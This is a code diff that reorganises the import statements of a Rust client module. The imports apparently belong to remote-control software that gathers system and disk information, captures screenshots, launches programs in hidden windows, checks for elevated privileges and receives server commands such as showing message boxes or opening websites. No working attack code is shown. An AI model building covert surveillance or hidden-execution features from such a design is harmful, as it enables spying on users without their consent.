@@ -1,36 +1,24 @@
-use std::net::TcpStream;
-
 use sysinfo::{ System, Disks };
 use screenshots::{ image, Screen };
+
 use std::io::Cursor;
+use std::ptr;
+use std::ptr::null_mut as NULL;
+use std::ffi::OsStr;
+use std::os::windows::{process::CommandExt, ffi::OsStrExt};
 
+use winapi::um::{shellapi::ShellExecuteW, winuser};
+use winapi::um::winuser::{ SW_HIDE, EnumDisplayMonitors };
 use winapi::shared::winerror::{ S_OK, DXGI_ERROR_NOT_FOUND };
-use winapi::shared::dxgi::{ CreateDXGIFactory, IDXGIFactory };
-use winapi::shared::dxgi::IDXGIAdapter;
-use winapi::Interface;
-
-use winapi::um::winuser::EnumDisplayMonitors;
+use winapi::shared::dxgi::{ CreateDXGIFactory, IDXGIFactory, IDXGIAdapter };
+use winapi::shared::minwindef::UINT;
 use winapi::shared::windef::{ HMONITOR, HDC, RECT };
 use winapi::shared::minwindef::{ BOOL, LPARAM };
-use std::ptr;
-
-
-use winapi::um::shellapi::{ ShellExecuteW, ShellExecuteExW, SHELLEXECUTEINFOW };
-use winapi::um::winuser::{ SW_HIDE, SW_SHOW, SW_SHOWNORMAL };
-use winapi::shared::minwindef::{ HINSTANCE, UINT };
-
-use std::os::windows::process::CommandExt;
-use std::ffi::OsStr;
-use std::os::windows::ffi::OsStrExt;
+use winapi::Interface;
 
 use crate::service::install::is_elevated;
 
-use std::ptr::null_mut as NULL;
-use winapi::um::winuser;
-
-use common::async_impl::packets::MessageBoxData;
-use common::async_impl::packets::VisitWebsiteData;
-use common::async_impl::packets::ClientInfo;
+use common::async_impl::packets::{MessageBoxData, VisitWebsiteData, ClientInfo};
 
 pub fn client_info() -> ClientInfo{
     let mut s = System::new_all();
